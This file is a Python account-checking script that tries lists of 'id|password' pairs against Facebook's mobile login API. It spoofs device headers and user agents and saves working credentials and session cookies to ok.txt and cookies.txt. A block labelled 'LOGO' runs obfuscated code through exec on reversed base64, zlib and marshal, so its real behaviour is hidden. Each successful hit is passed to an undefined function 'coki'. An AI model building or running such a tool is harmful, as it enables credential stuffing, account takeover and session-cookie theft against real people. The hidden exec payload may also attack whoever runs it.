import requests
import random
import uuid
import base64
import os
import sys
import time
#___________LOGO_____________#
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==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'))
print("[+] ID CHECKING IS STARTED PLEASE WAIT ")
time.sleep(3)
def randBuildLSB():
    return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))

def check_ids(filename):
    oks = []
    cps = []
    try:
        with open(filename, 'r') as f:
            lines = f.readlines()
    except FileNotFoundError:
        print('Opps File Not Found ...')
        return

    for line in lines:
        sid, ps = line.strip().split('|')
        data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": sid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"
        }
        headers = {
            'User-Agent': randBuildLSB(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'x-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
        }
        q = requests.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).json()
        if 'session_key' in q:
            ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
            ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
            cookie = f"sb={ssbb};{ckkk}"
            print(f"[OK] {sid} | {ps}")
            oks.append(sid)
            coki(f"[OK] {sid} | {ps}")
            with open(os.path.join(os.path.dirname(filename), 'ok.txt'), 'a') as f:
                f.write(f"{sid} | {ps}\n")
            with open(os.path.join(os.path.dirname(filename), 'cookies.txt'), 'a') as f:
                f.write(f"{cookie}\n")
        elif 'www.facebook.com' in q['error']['message']:
            print(f"[CP] {sid} | {ps}")
            cps.append(sid)
            with open(os.path.join(os.path.dirname(filename), 'cp.txt'), 'a') as f:
                f.write(f"{sid} | {ps}\n")
        else:
            print(f"[CP] {sid} | {ps}")

    print(f"Finished checking {len(lines)} ids.")
    print(f"OKs: {len(oks)}")
    print(f"CPs: {len(cps)}")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Please provide the file location as an argument.')
        print('[+] EXAMPLE python checker.py /sdcard/{YOUR_FILE_LOC.txt}')
    else:
        filename = sys.argv[1]
        check_ids(filename)
        ok = open('/sdcard/ok.txt','r').read()
        coki(ok)
